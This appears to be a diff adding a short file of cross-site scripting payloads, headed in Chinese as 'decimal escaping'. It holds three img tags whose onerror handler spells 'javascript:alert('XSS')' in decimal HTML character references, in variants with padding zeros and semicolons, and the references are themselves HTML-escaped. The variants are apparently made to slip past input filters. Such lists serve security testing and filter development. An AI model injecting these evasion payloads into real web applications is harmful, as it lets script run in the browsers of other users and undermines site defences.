@@ -1,0 +1,10 @@
+10进制转义
+以下原文为：&lt;img src=d onerror=javascript:alert('XSS')&gt;
+<img src=d onerror="&amp;&num;106&amp;&num;97&amp;&num;118&amp;&num;97&amp;&num;115&amp;&num;99&amp;&num;114&amp;&num;105&amp;&num;112&amp;&num;116&amp;&num;58&amp;&num;97&amp;&num;108&amp;&num;101&amp;&num;114&amp;&num;116&amp;&num;40&amp;&num;39&amp;&num;88&amp;&num;83&amp;&num;83&amp;&num;39&amp;&num;41">
+
+<img src=d onerror="&amp;&num;0106&semi;&amp;&num;0097&semi;&amp;&num;0118&semi;&amp;&num;0097&semi;&amp;&num;0115&semi;&amp;&num;0099&semi;&amp;&num;0114&semi;&amp;&num;0105&semi;&amp;&num;0112&semi;&amp;&num;0116&semi;&amp;&num;0058&semi;&amp;&num;0097&semi;&amp;&num;0108&semi;&amp;&num;0101&semi;&amp;&num;0114&semi;&amp;&num;0116&semi;&amp;&num;0040&semi;&amp;&num;0039&semi;&amp;&num;0088&semi;&amp;&num;0083&semi;&amp;&num;0083&semi;&amp;&num;0039&semi;&amp;&num;0041&semi;">
+
+<img src=d onerror="&amp;&num;000106&semi;&amp;&num;000097&semi;&amp;&num;000118&semi;&amp;&num;000097&semi;&amp;&num;000115&semi;&amp;&num;000099&semi;&amp;&num;000114&semi;&amp;&num;000105&semi;&amp;&num;000112&semi;&amp;&num;000116&semi;&amp;&num;000058&semi;&amp;&num;000097&semi;&amp;&num;000108&semi;&amp;&num;000101&semi;&amp;&num;000114&semi;&amp;&num;000116&semi;&amp;&num;000040&semi;&amp;&num;000039&semi;&amp;&num;000088&semi;&amp;&num;000083&semi;&amp;&num;000083&semi;&amp;&num;000039&semi;&amp;&num;000041&semi;">
+
+
+
